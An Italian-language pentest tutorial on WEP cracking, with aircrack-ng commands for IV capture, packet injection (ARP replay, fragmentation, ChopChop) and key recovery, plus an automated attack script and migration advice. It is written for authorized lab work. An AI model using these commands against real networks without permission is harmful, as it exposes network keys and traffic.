# IV Attacks (WEP Cracking)

## Scopo

Questa guida copre gli attacchi basati su IV (Initialization Vector) contro WEP, un protocollo di sicurezza WiFi obsoleto e vulnerabile.

## Prerequisiti

- Scheda WiFi con monitor mode e packet injection
- Kali Linux
- aircrack-ng suite
- Rete WEP per testing (lab)
- **Autorizzazione scritta**

## Installazione

```bash
sudo apt-get update
sudo apt-get install aircrack-ng
```

---

## Perché WEP è Vulnerabile

```
WEP usa RC4 con IV di 24 bit
- Solo 16.7 milioni di IV possibili
- IV trasmesso in chiaro
- Collisioni IV inevitabili
- FMS/KoreK/PTW attacks sfruttano weak IVs
```

---

## Workflow Attacco

```
1. Monitor mode
2. Cattura traffico (IVs)
3. Accelera cattura (injection)
4. Crack con aircrack-ng
```

---

## Setup

```bash
# Verifica interfacce
sudo airmon-ng

# Kill processi interferenti
sudo airmon-ng check kill

# Avvia monitor mode
sudo airmon-ng start wlan0

# Verifica
iwconfig
```

---

## Cattura IVs

### Airodump-ng

```bash
# Scan tutte le reti
sudo airodump-ng wlan0mon

# Target specifico
sudo airodump-ng -c CHANNEL --bssid AP_BSSID -w capture wlan0mon

# Monitora colonna #Data (IVs)
```

### IVs Necessari

| Attacco | IVs Approssimativi |
|---------|-------------------|
| PTW | 20,000 - 40,000 |
| FMS/KoreK | 250,000 - 500,000 |

---

## Accelerare Cattura

### Fake Authentication

```bash
# Associa alla rete
sudo aireplay-ng -1 0 -e ESSID -a AP_BSSID -h YOUR_MAC wlan0mon

# Verifica associazione in airodump (AUTH column)
```

### ARP Request Replay

```bash
# Cattura e reinvia ARP (genera IVs)
sudo aireplay-ng -3 -b AP_BSSID -h YOUR_MAC wlan0mon

# Attendi "#" che indica ARP catturati
# IVs aumentano rapidamente
```

### Interactive Packet Replay

```bash
# Se ARP replay non funziona
sudo aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b AP_BSSID -h YOUR_MAC wlan0mon
```

### Fragmentation Attack

```bash
# Ottiene PRGA per crafting pacchetti
sudo aireplay-ng -5 -b AP_BSSID -h YOUR_MAC wlan0mon

# Genera pacchetti ARP
packetforge-ng -0 -a AP_BSSID -h YOUR_MAC -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w arp-request

# Inietta
sudo aireplay-ng -2 -r arp-request wlan0mon
```

### ChopChop Attack

```bash
# Alternativa a fragmentation
sudo aireplay-ng -4 -b AP_BSSID -h YOUR_MAC wlan0mon
```

---

## Cracking

### PTW Attack (Veloce)

```bash
# Con ~40,000 IVs
sudo aircrack-ng -z capture-01.cap
```

### FMS/KoreK

```bash
# Con molti IVs
sudo aircrack-ng capture-01.cap
```

### Con Dizionario

```bash
aircrack-ng -w wordlist.txt capture-01.cap
```

---

## Ottimizzazioni

```bash
# Usa tutti i core CPU
aircrack-ng -p 4 capture-01.cap

# PTW ottimizzato (solo ARP)
aircrack-ng -z -0 capture-01.cap
```

---

## Script Automatizzato

```bash
#!/bin/bash
# wep_crack.sh

IFACE="wlan0mon"
BSSID="XX:XX:XX:XX:XX:XX"
CHANNEL="6"
ESSID="TargetNetwork"

# Cattura
airodump-ng -c $CHANNEL --bssid $BSSID -w wep_capture $IFACE &
sleep 5

# Fake auth
aireplay-ng -1 0 -e "$ESSID" -a $BSSID $IFACE

# ARP replay
aireplay-ng -3 -b $BSSID $IFACE &

# Aspetta IVs sufficienti
sleep 120

# Crack
aircrack-ng -z wep_capture-01.cap
```

---

## Perché WEP Non Deve Essere Usato

| Problema | Impatto |
|----------|---------|
| IV piccolo (24 bit) | Collisioni frequenti |
| No protezione replay | Injection attacks |
| Chiave statica | Compromissione permanente |
| CRC invece di MIC | Modifica pacchetti |
| RC4 con weak IVs | Cracking rapido |

---

## Mitigazioni

### Migrazione

```
WEP → WPA2-Personal (minimo)
WEP → WPA2-Enterprise (consigliato)
WEP → WPA3 (best practice)
```

### Se WEP Necessario (Legacy)

- VPN over WiFi
- Network segmentation
- Monitoring intensivo
- Piano migrazione

---

## Best Practices

- **Non usare WEP**: Mai in produzione
- **Migra immediatamente**: WPA2/WPA3
- **Lab only**: Test solo in ambiente controllato
- **Autorizzazione**: Scritta e specifica
- **Documenta**: Per security assessment

## Riferimenti

- [Aircrack-ng Documentation](https://www.aircrack-ng.org/doku.php?id=getting_started)
- [PTW Attack Paper](https://eprint.iacr.org/2007/120.pdf)
- [FMS Attack](https://www.cs.cornell.edu/people/egs/615/rc4_ksaproc.pdf)
